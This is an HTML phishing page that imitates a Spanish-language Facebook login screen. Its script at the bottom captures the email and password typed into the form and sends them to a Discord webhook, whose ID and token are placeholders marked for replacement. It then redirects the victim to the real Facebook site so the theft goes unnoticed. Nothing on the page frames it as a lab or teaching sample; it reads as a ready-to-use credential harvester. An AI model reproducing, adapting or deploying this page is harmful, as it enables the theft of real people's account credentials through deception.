<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 480px;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .logo-section {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            font-size: 40px;
            font-weight: bold;
            color: #1877f2;
            text-transform: uppercase;
        }

        .tagline {
            font-size: 16px;
            color: #606770;
            margin-top: 10px;
        }

        .login-section {
            padding: 10px;
        }

        .login-container {
            width: 100%;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            background-color: #f0f2f5;
            color: #1c1e21;
            font-size: 14px;
        }

        .input-field:focus {
            border-color: #1877f2;
            outline: none;
            background-color: white;
            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-button:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }

        .forgot-password a {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dddfe2;
        }

        .create-account {
            text-align: center;
        }

        .create-button {
            padding: 10px 20px;
            background-color: #42b72a;
            color: white;
            font-size: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s ease;
        }

        .create-button:hover {
            background-color: #36a420;
        }

        /* Responsive styles */
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }

            .logo {
                font-size: 35px;
            }

            .tagline {
                font-size: 14px;
            }

            .input-field {
                font-size: 12px;
            }

            .login-button {
                font-size: 14px;
            }

            .create-button {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <h1 class="logo">facebook</h1>
            <p class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        
        <div class="login-section">
            <div class="login-container">
                <form id="loginForm" method="post">
                    <input type="text" id="email" class="input-field" placeholder="Correo electrónico o número de teléfono" required>
                    <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
                    <button type="submit" class="login-button">Iniciar sesión</button>
                    
                    <div class="forgot-password">
                        <a href="https://www.facebook.com/recover/initiate">¿Olvidaste tu contraseña?</a>
                    </div>
                    
                    <div class="divider"></div>
                    
                    <div class="create-account">
                        <button type="button" class="create-button">Crear cuenta nueva</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        document.querySelector('#loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.querySelector('#email').value;
            const password = document.querySelector('#password').value;

            const data = {
                email: email,
                password: password
            };

            // Reemplazar la URL del webhook con la proporcionada desde la página A
            const webhookUrl = "https://discord.com/api/webhooks/[ID]/[TOKEN]"; // Cambiar con la URL proporcionada
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                // Después de enviar los datos al webhook, redirigir
                window.location.href = "https://www.facebook.com"; // Redirigir a una página deseada
            })
            .catch(error => {
                console.error('Error al enviar los datos:', error);
            });
        });
    </script>
</body>
</html>
